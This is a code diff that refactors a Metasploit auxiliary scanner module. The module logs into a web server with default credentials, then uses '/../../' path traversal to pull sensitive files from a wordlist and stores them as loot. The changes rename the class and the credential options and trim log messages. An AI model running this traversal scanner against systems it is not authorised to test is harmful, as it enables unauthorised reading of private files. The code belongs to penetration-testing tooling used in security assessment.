@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
@@ -31,9 +28,9 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptPath.new('FILELIST',  [ true, "File containing sensitive files, one per line",
           File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
-        OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
-        OptString.new('PASSWORD',[ true, 'Password to login with', 'password'])
-      ], self.class)
+        OptString.new('HttpUsername',[ true, 'User to login with', 'service']),
+        OptString.new('HttpPassword',[ true, 'Password to login with', 'service'])
+      ])
   end
 
   def extract_words(wordfile)
@@ -49,7 +46,7 @@ class Metasploit3 < Msf::Auxiliary
     return save_array
   end
 
-  #traversal every file
+  # traverse every file
   def find_files(file,user,pass)
     traversal = '/../../'
 
@@ -60,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 200 and res.body !~ /404\ File\ Not\ Found/
-      print_good("#{rhost}:#{rport} - Request may have succeeded on file #{file}")
+      print_good("Request may have succeeded on file #{file}")
       report_web_vuln({
         :host     => rhost,
         :port     => rport,
@@ -74,20 +71,20 @@ class Metasploit3 < Msf::Auxiliary
         :method   => "GET"
       })
 
-      loot = store_loot("lfi.data","text/plain",rhost, res.body,file)
-      vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
+      loot = store_loot("lfi.data","text/plain", rhost, res.body, file)
+      vprint_good("File #{file} downloaded to: #{loot}")
     elsif res and res.code
-      vprint_error("#{rhost}:#{rport} - Attempt returned HTTP error #{res.code} when trying to access #{file}")
+      vprint_error("Attempt returned HTTP error #{res.code} when trying to access #{file}")
     end
   end
 
   def run_host(ip)
-    user = datastore['USERNAME']
-    pass = datastore['PASSWORD']
+    user = datastore['HttpUsername']
+    pass = datastore['HttpPassword']
 
-    vprint_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
+    vprint_status("Trying to login with #{user} / #{pass}")
 
-    #test login
+    # test login
     begin
       res = send_request_cgi({
         'uri'        => '/',
@@ -100,14 +97,14 @@ class Metasploit3 < Msf::Auxiliary
       return :abort if (res.code == 404)
 
       if [200, 301, 302].include?(res.code)
-        vprint_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
+        vprint_good("Successful login #{user}/#{pass}")
       else
-        vprint_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
+        vprint_error("No successful login possible with #{user}/#{pass}")
         return :abort
       end
 
     rescue ::Rex::ConnectionError
-      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+      vprint_error("Failed to connect to the web server")
       return :abort
     end
 
